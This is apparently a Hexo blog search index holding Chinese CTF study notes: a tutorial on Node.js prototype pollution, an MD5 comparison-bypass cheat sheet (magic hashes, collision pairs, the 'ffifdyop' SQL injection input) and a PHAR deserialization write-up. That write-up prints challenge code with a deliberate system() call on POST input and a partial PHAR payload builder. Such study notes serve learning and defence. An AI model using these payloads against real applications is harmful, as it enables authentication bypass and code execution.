<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>nodejs原型链污染</title>
      <link href="/2025/04/17/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2025/04/17/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p><strong>constructor.prototype</strong>可以代替**<strong>proto</strong>**</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>先来了解一下<strong>Nodejs和JavaScipt和JSON的区别</strong>吧，一直也是懵懵懂懂</p><p>如果没有node，那么我们的JavaScript代码则由浏览器中的<strong>JavaScript解析器</strong>进行解析。几乎所有的浏览器都配备了JavaScript的解析功能（最出名的就是google的v8）， 这也是为什么我们能在f12中直接执行JavaScript的原因</p><p>而Nodejs则是由这个解析器单独从浏览器中拿出来，并进行了一系列的处理，最后成为了一个可以在服务端运行JavaScript的环境</p><p>JSON是JavaScript的对象表示方法，它表示的是声明对象的一种格式， 由于我们从前端接收到的数据基本都是字符串，因此在服务端如果要将这些字符串处理为其他格式，比如对象，就需要用到JSON了。</p><p>接着便是引入我们的nodejs原型链污染的知识了</p><h5 id="原型对象（prototype）与原型连接点（proto）与原型链"><a href="#原型对象（prototype）与原型连接点（proto）与原型链" class="headerlink" title="原型对象（prototype）与原型连接点（proto）与原型链"></a>原型对象（prototype）与原型连接点（<strong>proto</strong>）与原型链</h5><p>在c++或java这些面向对象的语言中，我们如果想要一个对象，首先需要使用关键字class声明一个类，再使用关键字new一个对象出来(经常书写的php也是这样)，但是在JavaScript中没有class以及类这种概念（为了简化编写JavaScript代码，ECMAScript 6后增加了class语法，但class其实只是一个语法糖）。 在JavaScript有这么两种声明对象的方式</p><p><strong>直接实例化构造方法Object()来创建对象</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">person=new Object()person.firstname="John";person.lastname="Doe";person.age=50;person.eyecolor="blue";这种创建对象的方法还有另一种写法 如下person={firstname:"John",lastname:"Doe",age:50,eyecolor:"blue"};这种方法通过直接实例化构造方法Object()来创建对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>先创建构造函数 再实例化构造函数</strong></p><pre class="line-numbers language-language-python"><code class="language-language-python">function person(firstname,lastname,age,eyecolor)  这里创建了一个“类” 但是在JavaScript中叫做构造函数或者构造器{    this.firstname=firstname;    this.lastname=lastname;    this.age=age;    this.eyecolor=eyecolor;}var myFather=new person("John","Doe",50,"blue");    通过这个“类”实例化对象var myMother=new person("Sally","Rally",48,"green");这种方法先创建构造函数 再实例化构造函数 构造函数function也属于Object 如果对这里为什么属于Object而不属于Function有疑问请继续阅读 下面会解释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>既然是通过实例化Object来创建对象或创建构造函数，在JavaScript中有两个很特殊的对象，Function() 和 Object() ，它们两个既是构造函数也是对象，作为对象是不是应该有一个“类”去作为他们的模板呢？</p><p>对于Object()来说，要声明这么一个构造函数我们可以使用关键字function来创建 。（在底层 使用function创建一个函数 其实就相当于这个过程）</p><pre class="line-numbers language-language-python"><code class="language-language-python">function Object(){    }在底层为var Object = new Function();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先引入一些概念方便理解以下的讲解</p><p><strong><strong>proto</strong><strong>是任何一个</strong>对象</strong>拥有的属性</p><p><strong>prototype</strong>是任何一个<strong>函数</strong>拥有的一个属性</p><p>那么对于Function自己这个对象，他是怎么来的呢？如果用<strong>Function.<strong>proto</strong><strong>和</strong>Function.prototype</strong>进行比较，发现<strong>二者是全等</strong>的，所以Function创造了自己，也创造了Object，所以JavaScript中，<strong>所有函数都是对象，而对象是通过函数创建的</strong>。因此</p><p><strong>构造函数.prototype.__proto__应该是Object.prototype，而不是Function.prototype，Function的作用是创建而不是继承。</strong></p><p><strong>eg;</strong></p><p><strong>person=….</strong></p><p>这个person对象就拥有了<strong>person.<strong>proto</strong><strong>这个属性，而Object()我们刚才提到了是由Function创建来的一个构造函数，那么Object就天生有了</strong>Object.prototype。</strong></p><p>为什么要说这些呢就是为了说明白</p><p>1.某一对象的__proto__指向它的prototype（原型对象）， 也就是说如果</p><p><strong>直接访问person.<strong>proto</strong> 那么就相当于访问了Object.prototype。</strong></p><p>2.JavaScript使用prototype链实现继承机制。</p><p>3.构造函数xxx.prototype是一个对象，xxx.prototype也有自己的__proto__属性，并且可以继续指向它的的prototype。</p><p>4.Object.prototype.proto最终指向null，这也是所有原型链的终点。</p><p>5.从一个对象的__proto__不断向上指向原型对象，最终指向Objecct.prototype后，接着指向为Null，这一条链子就叫做原型链。</p><h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a><strong>例子</strong></h6><p>这么长的文章也是讲的略显抽象，我们来个例子便于理解</p><pre class="line-numbers language-language-python"><code class="language-language-python">function Father() {    this.first_name = 'Donald'    this.last_name = 'Trump'}function Son() {    this.first_name = 'Melania'}Son.prototype = new Father()let son = new Son()console.log(`Name: ${son.first_name} ${son.last_name}`)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上边的例子中（下边语言非正式完全准确，为个人总结便于理解，以待不断改正）</p><p>son.__proto__就指向了Son.prototype</p><p><strong>直接访问对象.<strong>proto</strong> 那么就相当于访问了构造函数.prototype。注意对于第一种的实例方法（没构造函数换句话说构造方法就是Object）会指向Object.prototype</strong></p><p>Son.prototype.__proto__指向father.prototype</p><p><strong>Son.prototype = new Father()+上一条理解</strong></p><p>father.prototype.__proto__指向Object.prototype</p><p><strong>构造函数.prototype.__proto__应该是Object.prototype</strong></p><p>Object.prototype.proto指向null</p><p><strong>Object.prototype.proto最终指向null，这也是所有原型链的终点。</strong></p><p>我们在简单引入一下程序运行过程，以理解原型链污染の原理</p><p>对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li><font style="color:rgb(0, 0, 0);">在对象son中寻找last_name。</font></li><li><font style="color:rgb(0, 0, 0);">如果找不到，则在son.__proto__中寻找last_name。</font></li><li><font style="color:rgb(0, 0, 0);">如果仍然找不到，则继续在son.<strong>proto</strong>.__proto__中寻找last_name。</font></li><li><font style="color:rgb(0, 0, 0);">依次寻找，直到找到null结束。</font></li></ol><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a><strong>原型链污染</strong></h1><p>ok，前置知识基本已经明了，我们直接上例子来理解污染</p><pre class="line-numbers language-language-python"><code class="language-language-python">// 这个对象直接实例化Object()let foo = {bar: 1}// foo.bar 此时为1console.log(foo.bar)// 修改foo的原型（即Object）foo.__proto__.bar = 2// 由于查找顺序的原因，foo.bar仍然是1console.log(foo.bar)// 此时再用Object创建一个空的zoo对象let zoo = {}// 查看zoo.barconsole.log(zoo.bar)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里由于修改了foo.<strong>proto</strong>.bar 也就是修改了Object.bar，因此在后续的实例化对象中，新的对象会继承这一属性 造成了原型链污染。</p><p>但是上边很显然是我们自己的实验过程，在ctf中什么情况可以使用呢</p><p>和python原型链污染类似，有合并函数对象merge，对象clone（其实内核就是将待操作的对象merge到一个空对象中），再举一个伪ctf的例子</p><p>eg：</p><pre class="line-numbers language-language-python"><code class="language-language-python">function merge(target, source) {    for (let key in source) {        if (key in source && key in target) {              // 如果target与source有相同的键名 则让target的键值为source的键值            merge(target[key], source[key])        } else {            target[key] = source[key]  // 如果target与source没有相通的键名 则直接在target新建键名并赋给键值        }    }}let o1 = {}let o2 = {a: 1, "__proto__": {b: 2}}merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)//1 2//undefined<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font style="color:rgb(43, 144, 91);">// 如果target与source没有相通的键名 则直接在target新建键名并赋给键值</font></p><p>这里的__proto__被当作普通建值处理了，merge(o1, o2) 的执行相当于再o1新建merge(o1, o2) 的执行相当于也就是o1变成了**{a: 1, “<strong>proto</strong>“: {b: 2}}**</p><p>原型对象Object并没有被更改</p><p>我么稍作更改把o2以json格式传递来确保__proto__不被当做普通键值</p><pre class="line-numbers language-language-python"><code class="language-language-python">let o1 = {}let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)//1 2//2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font style="color:rgb(43, 144, 91);">// 如果target与source有相同的键名 则让target的键值为source的键值 merge(target[key], source[key])</font></p><p>这里等于 merge(Object.prototype, b: 2)，把<strong>所有对象的原型都污染了，<strong>o1变成了</strong>{a:1,b: 2}</strong></p><h1 id="深入理解-JavaScript-Prototype-污染攻击"><a href="#深入理解-JavaScript-Prototype-污染攻击" class="headerlink" title="深入理解 JavaScript Prototype 污染攻击"></a><strong>深入理解 JavaScript Prototype 污染攻击</strong></h1><p>以上内容过于复杂繁琐，我这里引用一下p神及其简洁的总结</p><ol><li><font style="color:rgb(0, 0, 0);">每个构造函数(constructor)都有一个原型对象(prototype)</font></li><li><font style="color:rgb(0, 0, 0);">对象的__proto__属性，指向类的原型对象prototype</font></li><li><font style="color:rgb(0, 0, 0);">JavaScript使用prototype链实现继承机制</font></li></ol>]]></content>
      
      
      <categories>
          
          <category> 原型链污染 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> nodejs原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5整理</title>
      <link href="/2025/04/16/md5/"/>
      <url>/2025/04/16/md5/</url>
      
        <content type="html"><![CDATA[<p>md5的常规payload整理，如有错误，请佬指出</p><h1 id="一-md5弱比较比较"><a href="#一-md5弱比较比较" class="headerlink" title="一.md5弱比较比较"></a>一.md5弱比较比较</h1><h2 id="1-0e绕过"><a href="#1-0e绕过" class="headerlink" title="1.0e绕过"></a>1.0e绕过</h2><p>部分字符串经过md5加密之后为0exxxx的格式，相当于0的xxxx次方，所以无论xxxx是什么，函数判断时</p><p>会认为相等。</p><p>例如</p><p>a=QNKCDZO,加密后为0e830400451993494058024219903391</p><p>b=240610708,加密后为0e462097431906509019562988736854</p><p>所以既满足了a!=b，也满足了md5($ a) == md5( $b），即可绕过</p><p>这里附上常见的0E开头的MD5<br>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s532378020a<br>0e220463095855511507588041205815<br>s1665632922a<br>0e731198061491163073197128363787<br>s1184209335a<br>0e072485820392773389523109082030<br>s1885207154a<br>0e509367213418206700842008763514<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>详细<br>//数字字母<br>s878926199a 0e545993274517709034328855841020<br>s155964671a 0e342768416822451524974117254469<br>s214587387a 0e848240448830537924465865611904<br>s214587387a 0e848240448830537924465865611904<br>s878926199a 0e545993274517709034328855841020<br>s1091221200a 0e940624217856561557816327384675<br>s1885207154a 0e509367213418206700842008763514<br>s1502113478a 0e861580163291561247404381396064<br>s1885207154a 0e509367213418206700842008763514<br>s1836677006a 0e481036490867661113260034900752<br>s155964671a 0e342768416822451524974117254469<br>s1184209335a 0e072485820392773389523109082030<br>s1665632922a 0e731198061491163073197128363787<br>s1502113478a 0e861580163291561247404381396064<br>s1836677006a 0e481036490867661113260034900752<br>s1091221200a 0e940624217856561557816327384675<br>s155964671a 0e342768416822451524974117254469<br>s1502113478a 0e861580163291561247404381396064<br>s155964671a 0e342768416822451524974117254469<br>s1665632922a 0e731198061491163073197128363787<br>s155964671a 0e342768416822451524974117254469<br>s1091221200a 0e940624217856561557816327384675<br>s1836677006a 0e481036490867661113260034900752<br>s1885207154a 0e509367213418206700842008763514<br>s532378020a 0e220463095855511507588041205815<br>s878926199a 0e545993274517709034328855841020<br>s1091221200a 0e940624217856561557816327384675<br>s214587387a 0e848240448830537924465865611904<br>s1502113478a 0e861580163291561247404381396064<br>s1091221200a 0e940624217856561557816327384675<br>s1665632922a 0e731198061491163073197128363787<br>s1885207154a 0e509367213418206700842008763514<br>s1836677006a 0e481036490867661113260034900752<br>s1665632922a 0e731198061491163073197128363787<br>s878926199a 0e545993274517709034328855841020<br>//数字<br>240610708 0e462097431906509019562988736854<br>314282422 0e990995504821699494520356953734<br>571579406 0e972379832854295224118025748221<br>903251147 0e174510503823932942361353209384<br>1110242161 0e435874558488625891324861198103<br>1320830526 0e912095958985483346995414060832<br>1586264293 0e622743671155995737639662718498<br>2302756269 0e250566888497473798724426794462<br>2427435592 0e067696952328669732475498472343<br>2653531602 0e877487522341544758028810610885<br>3293867441 0e471001201303602543921144570260<br>3295421201 0e703870333002232681239618856220<br>3465814713 0e258631645650999664521705537122<br>3524854780 0e507419062489887827087815735195<br>3908336290 0e807624498959190415881248245271<br>4011627063 0e485805687034439905938362701775<br>4775635065 0e998212089946640967599450361168<br>4790555361 0e643442214660994430134492464512<br>5432453531 0e512318699085881630861890526097<br>5579679820 0e877622011730221803461740184915<br>5585393579 0e664357355382305805992765337023<br>6376552501 0e165886706997482187870215578015<br>7124129977 0e500007361044747804682122060876<br>7197546197 0e915188576072469101457315675502<br>7656486157 0e451569119711843337267091732412<br>//字母<br>QLTHNDT 0e405967825401955372549139051580<br>QNKCDZO 0e830400451993494058024219903391<br>EEIZDOI 0e782601363539291779881938479162<br>TUFEPMC 0e839407194569345277863905212547<br>UTIPEZQ 0e382098788231234954670291303879<br>UYXFLOI 0e552539585246568817348686838809<br>IHKFRNS 0e256160682445802696926137988570<br>PJNPDWY 0e291529052894702774557631701704<br>ABJIHVY 0e755264355178451322893275696586<br>DQWRASX 0e742373665639232907775599582643<br>DYAXWCA 0e424759758842488633464374063001<br>GEGHBXL 0e248776895502908863709684713578<br>GGHMVOE 0e362766013028313274586933780773<br>GZECLQZ 0e537612333747236407713628225676<br>NWWKITQ 0e763082070976038347657360817689<br>NOOPCJF 0e818888003657176127862245791911<br>MAUXXQC 0e478478466848439040434801845361<br>MMHUWUV 0e701732711630150438129209816536 </p><h2 id="2-数组绕过"><a href="#2-数组绕过" class="headerlink" title="2.数组绕过"></a>2.数组绕过</h2><p>a[]=&amp;b[]=2</p><h1 id="二-双重md5下的0e绕过"><a href="#二-双重md5下的0e绕过" class="headerlink" title="二.双重md5下的0e绕过"></a>二.双重md5下的0e绕过</h1><p><strong>7r4lGXCH2Ksu2JNT3BYM</strong></p><p><strong>CbDLytmyGm2xQyaLNhWn</strong></p><p><strong>770hQgrBOjrcqftrlaZk</strong><br>双MD5的：</p><p><strong>V5VDSHva7fjyJoJ33IQl</strong></p><p>md5(“V5VDSHva7fjyJoJ33IQl”) =&gt; 0e18bb6e1d5c2e19b63898aeed6b37ea</p><p>md5(“0e18bb6e1d5c2e19b63898aeed6b37ea”) =&gt; 0e0a710a092113dd5ec9dd47d4d7b86f</p><p><strong>CbDLytmyGm2xQyaLNhWn</strong></p><p>md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18</p><p>md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af</p><p><strong>770hQgrBOjrcqftrlaZk</strong></p><p>md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625</p><p>md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064</p><p><strong>7r4lGXCH2Ksu2JNT3BYM</strong></p><p>md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849</p><p>md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</p><h1 id="三-md5强比较"><a href="#三-md5强比较" class="headerlink" title="三.md5强比较"></a>三.md5强比较</h1><p>md5函数无法处理数组，也就是如果把a、b变成两个数组传入变量时，可以绕过md5</p><p>例如</p><p>a[]=1&amp;b[]=2</p><p>既满足a!=b，也可以绕过md5()函数</p><h1 id="四-sql之md5-password-ture"><a href="#四-sql之md5-password-ture" class="headerlink" title="四.sql之md5($password,ture)"></a>四.sql之md5($password,ture)</h1><p>输入<font style="color:rgb(243, 50, 50);">ffifdyop</font>，后端的SQL语句会变成：</p><p><em><strong><font style="color:rgb(0, 0, 0);">select * from <code>admin</code> where password=</font></strong><strong><strong><font style="color:rgb(243, 50, 50);">‘’or’6’ </font></strong></strong><strong><font style="color:rgb(0, 0, 0);"> —&gt; True</font></strong></em></p><h1 id="五-加密后弱相等-a-md5-a"><a href="#五-加密后弱相等-a-md5-a" class="headerlink" title="五.加密后弱相等$a==md5($a)"></a>五.加密后弱相等$a==md5($a)</h1><p>形式如下：</p><pre class="line-numbers language-language-python"><code class="language-language-python">if ($md5==md5($md5))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 可以找0e开头并且md5后仍然0e开头的字符串。</p><p> 这里可以用0e215962017</p><h1 id="六-碰撞"><a href="#六-碰撞" class="headerlink" title="六.碰撞"></a>六.碰撞</h1><p>真实碰撞对（md5值）</p><p>eg：</p><p>0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef</p><p>和0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef</p><p>两组经过url编码后的值:</p><p><strong>#1</strong></p><p>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p><p>b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><p><strong>#2</strong></p><p>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p><p>b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%</p><p><strong>#3</strong></p><p>$a=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;</p><p>$b=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;</p><h1 id="七-变量转换为字符串md5强相等绕过方法"><a href="#七-变量转换为字符串md5强相等绕过方法" class="headerlink" title="七.变量转换为字符串md5强相等绕过方法"></a>七.变量转换为字符串md5强相等绕过方法</h1><p>字符串不相等，md5的强类型相等</p><pre class="line-numbers language-language-python"><code class="language-language-python">string($a)!=string($b),md5($a)===md5($b)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;=&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;=</p><h1 id="八-上传的参数字符串且md5弱相等"><a href="#八-上传的参数字符串且md5弱相等" class="headerlink" title="八.上传的参数字符串且md5弱相等"></a>八.上传的参数字符串且md5弱相等</h1><pre class="line-numbers language-language-python"><code class="language-language-python">if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2']))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>科学法绕过</p><p>s878926199a</p><p>s155964671a</p><h1 id="九-NaN-和-INF"><a href="#九-NaN-和-INF" class="headerlink" title="九.NaN 和 INF"></a>九.NaN 和 INF</h1><p>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN===NAN都是false，但md5(‘NaN’)===md5(‘NaN’)为true</p><h1 id="十-HASH长度扩展攻击"><a href="#十-HASH长度扩展攻击" class="headerlink" title="十.HASH长度扩展攻击"></a>十.HASH长度扩展攻击</h1><p>前提条件</p><p>1.$a的MD5(**<u>09</u>**<strong>8f6bcd4621d373cade4e832627b4f6</strong>)</p><p>2.$a的长度=<strong>4</strong></p><p>3.$b我们可以任意控制<br>示例代码：</p><pre class="line-numbers language-language-python"><code class="language-language-python">if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) {    echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>不多赘述了直接利用<strong>hashpump工具来获得payoad</strong></p>]]></content>
      
      
      <categories>
          
          <category> 归纳整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5比较 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/16/hello-world/"/>
      <url>/2025/04/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>YUNiversity测试</p><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-language-bash"><code class="language-language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化漏洞</title>
      <link href="/2025/04/16/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/16/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>在打tgctf的时候碰到了文件上传+phar反序列化组合拳，之前有所了解但并没有掌握，趁复现好好的学习一下</p><p>先放上tg的源码</p><pre class="line-numbers language-language-python"><code class="language-language-python"><?phphighlight_file(__FILE__);error_reporting(0);function best64_decode($str){    return base64_encode(md5(base64_encode(md5($str))));    }class yesterday {    public $learn;    public $study="study";    public $try;    public function __construct()    {        $this->learn = "learn<br>";    }    public function __destruct()    {        echo "You studied hard yesterday.<br>";        return $this->study->hard();    }}class today {    public $doing;    public $did;    public $done;    public function __construct(){        $this->did = "What you did makes you outstanding.<br>";    }    public function __call($arg1, $arg2)    {        $this->done = "And what you've done has given you a choice.<br>";        echo $this->done;        if(md5(md5($this->doing))==666){            return $this->doing();        }        else{            return $this->doing->better;        }    }}class tommoraw {    public $good;    public $bad;    public $soso;    public function __invoke(){        $this->good="You'll be good tommoraw!<br>";        echo $this->good;    }    public function __get($arg1){        $this->bad="You'll be bad tommoraw!<br>";    }}class future{    private $impossible="How can you get here?<br>";    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __set($arg1, $arg2) {        if ($this->out->useful7) {            echo "Seven is my lucky number<br>";            system('whoami');        }    }    public function __toString(){        echo "This is your future.<br>";        system($_POST["wow"]);        return "win";    }    public function __destruct(){        $this->no = "no";        return $this->no;    }}if (file_exists($_GET['filename'])){    echo "Focus on the previous step!<br>";}else{    $data=substr($_GET['filename'],0,-4);    unserialize(best64($data));}// You learn yesterday, you choose today, can you get to your future??><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比较明显的特征就是无法正常进行反序列化(不可逆的md5加密)且存在文件上传的途径（这里没有放文件上传的源码）</p><p>我们先引入phar反序列化的概念</p><blockquote><p><strong>PHAR反序列化漏洞</strong>是与PHP中的对象反序列化相关的一种安全漏洞，特别是在处理PHAR文件时可能被利用。</p><p>概念解释：</p><p>PHAR文件：</p><p>PHAR 是一种类似于ZIP或TAR的归档格式，但它专门为PHP应用程序设计。一个PHAR文件可以包含PHP文件、图片、配置等内容，可以直接在PHP环境中执行。</p><p>PHAR反序列化漏洞： PHAR文件可以存储序列化的PHP对象。在某些情况下，PHP内置函数如file_exists()、is_file()等文件操作函数可以被用于处理包含PHAR存档的路径。例如，如果一个应用程序在未预期的情况下处理到PHAR文件并通过反序列化机制读取该文件，攻击者可以构造恶意的PHAR文件，使PHP反序列化攻击得以执行。</p></blockquote><p>对于晦涩的概念我向来无感，这里直接给上一个phar包(和jar包差不多)</p><p>比较重要的就是你要新建了一个类，还有一个就是setMetadata，这是核心</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phphighlight_file(_FILE_);class Destiny{  public $he_say;}@unlink(filename:'test-phar');//删除之前的test-phar文件（如果存在)$phar=new Phar(filename:'test.phar');//创建一个Phar对象，文件名必须以phar为后缀，生成后可以随意修改$phar->startBuffering()；//开始写入文件$phar->setStub("<?php __HALT_COMPILER(); ?>"); // 写入 stub$o = new Dest1ny();//这个是链子也可以放在 @前面$phar->setMetadata($o)；//写入元数据$phar->addFromString(localName:"test.txt",contents:"test"); 